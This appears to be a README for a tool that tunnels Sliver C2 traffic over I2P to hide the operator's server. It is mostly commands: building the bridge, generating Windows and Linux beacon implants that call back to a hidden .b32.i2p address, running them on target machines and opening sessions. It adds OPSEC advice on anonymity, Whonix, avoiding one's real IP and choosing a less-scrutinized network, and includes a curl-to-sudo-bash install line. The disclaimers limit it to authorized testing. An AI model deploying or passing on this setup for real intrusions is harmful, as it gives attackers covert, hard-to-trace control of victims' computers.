QuickestRound14's Sliver edit. Made for personal use.

# sliver-i2p-bridge

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)](https://go.dev/)

**I2P transport bridge for Sliver C2** — Anonymous command and control through the Invisible Internet Project.

> ⚠️ **For authorized security testing only.** This tool is intended for red team operations, penetration testing, and security research with proper authorization.

## What It Does

Creates an I2P hidden destination that forwards traffic to Sliver's HTTPS listener. Implants connect through I2P, you control them through Sliver normally.

```
┌──────────────┐      ┌─────────────────┐      ┌─────────────┐      ┌──────────────┐
│    Sliver    │◄────►│ sliver-i2p-     │◄────►│ I2P Network │◄────►│   Implant    │
│    Server    │      │ bridge          │      │             │      │              │
│   (:8443)    │      │ (SAM:7656)      │      │ (garlic)    │      │ (HTTP proxy) │
└──────────────┘      └─────────────────┘      └─────────────┘      └──────────────┘
```

## Why Use This

- **Your C2 server IP stays hidden** — implants only know the `.b32.i2p` address
- **Works with stock Sliver** — no framework modifications needed
- **I2P advantages over Tor:**
  - Better partition resistance (distributed hash table)
  - Designed for hidden services (garlic routing)
  - Less scrutinized than Tor exit nodes
- **Whonix-ready** — designed for high-security deployments
- **Single binary** — no Python dependencies, just Go

## Quick Start

### Prerequisites

- Go 1.21+
- I2P router with SAM bridge enabled (port 7656)
- Sliver C2 framework

### Build

```bash
git clone https://github.com/QuickestRound/sliver-i2p-bridge.git
cd sliver-i2p-bridge
go build -o sliver-i2p-bridge ./cmd/sliver-i2p-bridge
```

Or cross-compile for Linux:
```bash
make linux
```

### Usage

**1. Start I2P router and enable SAM:**
```bash
# Install I2P
sudo apt install i2p

# Enable SAM bridge in /var/lib/i2p/i2p-config/clients.config:
# clientApp.3.startOnLoad=true

# Start I2P
sudo systemctl start i2p

# Wait for bootstrap (~2-5 minutes)
# Check http://127.0.0.1:7657 for status
```

**2. Start Sliver with HTTPS listener:**
```bash
sliver-server
sliver > https -L 127.0.0.1 -l 8443
```

**3. Start the bridge:**
```bash
./sliver-i2p-bridge start --sliver-port 8443
```

Output:
```
[*] sliver-i2p-bridge starting...
[*] Sliver target: 127.0.0.1:8443
[*] SAM bridge: 127.0.0.1:7656
[+] I2P session established!
[+] B32 Address: abcdef1234567890...b32.i2p
[+] Bridge is READY!

[*] Generate implant with:
    sliver > generate --http http://abcdef1234567890.b32.i2p --os linux
```

**4. Generate and deploy implant:**
```bash
# In Sliver
sliver > generate --http http://<B32_ADDRESS>.b32.i2p --os linux --save implant

# On target (must have I2P with HTTP proxy)
HTTP_PROXY=http://127.0.0.1:4444 ./implant
```

## CLI Reference

```
sliver-i2p-bridge start [OPTIONS]
  --sliver-host    Sliver HTTPS listener host (default: 127.0.0.1)
  --sliver-port    Sliver HTTPS listener port (default: 8443)
  --sam-host       I2P SAM bridge host (default: 127.0.0.1)
  --sam-port       I2P SAM bridge port (default: 7656)
  --persist-keys   Use persistent destination keys
  --key-path       Path to destination key file (default: destination.keys)

sliver-i2p-bridge keygen [OPTIONS]
  --output         Output path for generated keys

sliver-i2p-bridge status
  Check SAM bridge connectivity

sliver-i2p-bridge stop
  Signal running bridge to shutdown (use Ctrl+C)
```

## Whonix Deployment (Full Guide)

For maximum anonymity, run everything on Whonix-Workstation.

### Step 1: Transfer to Whonix

```bash
# Option A: Clone from GitHub (on Whonix-Workstation)
git clone https://github.com/QuickestRound/sliver-i2p-bridge.git
cd sliver-i2p-bridge

# Option B: SCP from host machine
scp -r sliver-i2p-bridge user@whonix-ws:~/
```

### Step 2: Run Installer Script

```bash
chmod +x scripts/install-whonix.sh
sudo ./scripts/install-whonix.sh
```

This installs: I2P with SAM bridge, Go 1.21, builds the bridge binary, sets up systemd.

### Step 3: Wait for I2P Bootstrap

```bash
# Check I2P status
sudo systemctl status i2p

# Watch the I2P console (wait for "Network: OK")
# Open in browser: http://127.0.0.1:7657

# This takes 5-10 minutes on first start!
```

### Step 4: Install Sliver

```bash
# Download and install Sliver
curl https://sliver.sh/install | sudo bash

# Start Sliver server (in one terminal)
sliver-server

# Start HTTPS listener on localhost
sliver > https -L 127.0.0.1 -l 8443

# Keep this terminal open!
```

### Step 5: Start the Bridge

```bash
# In a new terminal
cd ~/sliver-i2p-bridge
./sliver-i2p-bridge start --sliver-port 8443

# You'll see:
# [+] B32 Address: xxxxxxxx.b32.i2p
# [+] Bridge is READY!

# SAVE THIS B32 ADDRESS - you need it for implants!
```

### Step 6: Generate Implant

```bash
# Back in Sliver console
sliver > generate --http http://<YOUR_B32_ADDRESS>.b32.i2p \
                  --os linux \
                  --arch amd64 \
                  --beacon-interval 30s \
                  --save /tmp/implant

# For Windows target:
sliver > generate --http http://<YOUR_B32_ADDRESS>.b32.i2p \
                  --os windows \
                  --arch amd64 \
                  --beacon-interval 30s \
                  --save /tmp/implant.exe
```

### Step 7: Deploy Implant on Target

Target machine MUST have I2P installed with HTTP proxy enabled:

```bash
# On target: Install I2P
sudo apt install i2p
sudo systemctl start i2p

# Wait for I2P to bootstrap (5-10 min)

# Run implant with I2P proxy
HTTP_PROXY=http://127.0.0.1:4444 ./implant
```

### Step 8: Receive Session

```bash
# Back in Sliver console, you should see:
# [*] Session opened...

sliver > sessions
sliver > use <SESSION_ID>
```

### Whonix-Specific Notes

| Topic | Details |
|-------|---------|
| **Traffic Path** | Target → I2P → (Tor via Whonix) → I2P → Bridge → Sliver |
| **Latency** | Expect 5-30s for commands due to Tor+I2P overhead |
| **Beacon Interval** | Use `--beacon-interval 30s` minimum |
| **Stream Isolation** | I2P doesn't support it — restart I2P between ops |
| **Persistent Address** | Use `--persist-keys` to keep same B32 across restarts |

### Running as Systemd Service

```bash
# Start bridge as service
sudo systemctl start sliver-i2p-bridge

# Enable on boot
sudo systemctl enable sliver-i2p-bridge

# Check status
sudo systemctl status sliver-i2p-bridge

# View logs
journalctl -u sliver-i2p-bridge -f
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    OPERATOR MACHINE                             │
│  ┌─────────────┐   ┌────────────────────┐   ┌───────────────┐  │
│  │   Sliver    │   │  sliver-i2p-bridge │   │  I2P Router   │  │
│  │   Server    │◄─►│                    │◄─►│  (SAM:7656)   │  │
│  │  (:8443)    │   │  - SAM session     │   │               │  │
│  │             │   │  - TLS forwarding  │   │  Creates:     │  │
│  │             │   │  - Key management  │   │  .b32.i2p     │  │
│  └─────────────┘   └────────────────────┘   └───────┬───────┘  │
└─────────────────────────────────────────────────────┼──────────┘
                                                      │
                        I2P NETWORK                   │
                ┌─────────────────────────────────────┴──────────┐
                │  ┌─────┐    ┌─────┐    ┌─────┐    ┌─────┐     │
                │  │Hop 1│───►│Hop 2│───►│Hop 3│───►│Hop 4│     │
                │  └─────┘    └─────┘    └─────┘    └─────┘     │
                │         Garlic Encrypted Tunnels              │
                └─────────────────────────────────────┬──────────┘
                                                      │
┌─────────────────────────────────────────────────────┼──────────┐
│                    TARGET MACHINE                   │          │
│  ┌───────────────────┐    ┌──────────────────────┐ │          │
│  │   I2P Client      │◄───┤   Sliver Implant     │ │          │
│  │  (HTTP proxy      │    │   HTTP_PROXY=:4444   │ │          │
│  │   :4444)          │    │                      │ │          │
│  └───────────────────┘    └──────────────────────┘ │          │
└─────────────────────────────────────────────────────────────────┘
```

## Security Considerations

| Consideration | Recommendation |
|--------------|----------------|
| Key Storage | Protect `destination.keys` with 0600 permissions |
| No Clearnet | Implants should ONLY connect via I2P, no fallback |
| Stream Isolation | I2P doesn't support it — run separate instances for separate ops |
| Beacon Interval | Set to 30s+ to handle I2P latency |
| OPSEC | Never generate/test implants from your real IP |

## Comparison: I2P vs Tor for C2

| Feature | I2P | Tor |
|---------|-----|-----|
| Hidden Service Design | Primary use case (garlic routing) | Secondary (onion services) |
| Network Size | Smaller (~30k nodes) | Larger (~7k relays) |
| Latency | Higher (2-5s) | Lower (1-2s) |
| Partition Resistance | Better (DHT-based) | Good |
| Exit Nodes | Not applicable (internal only) | Heavily monitored |
| Detection Profile | Less common, lower scrutiny | Well-known, more scrutiny |

## Troubleshooting

**SAM Connection Failed:**
```
failed to connect to SAM at 127.0.0.1:7656
```
- Verify I2P is running: `systemctl status i2p`
- Check SAM is enabled in I2P config
- Wait for I2P to finish bootstrapping (check console at :7657)

**Slow/No Connections:**
- I2P bootstrap takes 5-10 minutes on first start
- First connection after start is always slowest
- Check I2P console for tunnel health

**Implant Not Connecting:**
- Verify target has I2P with HTTP proxy on :4444
- Check `HTTP_PROXY` is set correctly
- Ensure implant was generated with correct B32 address

## Contributing

PRs welcome! Please:
1. Fork the repo
2. Create a feature branch
3. Test your changes
4. Submit a PR with clear description

## License

MIT — see [LICENSE](LICENSE)

## Credits

- Inspired by [sliver-tor-bridge](https://github.com/Otsmane-Ahmed/sliver-tor-bridge)
- Built with [go-sam-go](https://github.com/go-i2p/go-sam-go) SAM library
- For use with [Sliver C2](https://github.com/BishopFox/sliver) by BishopFox

---

**Disclaimer:** This tool is provided for authorized security testing and research purposes only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for misuse.
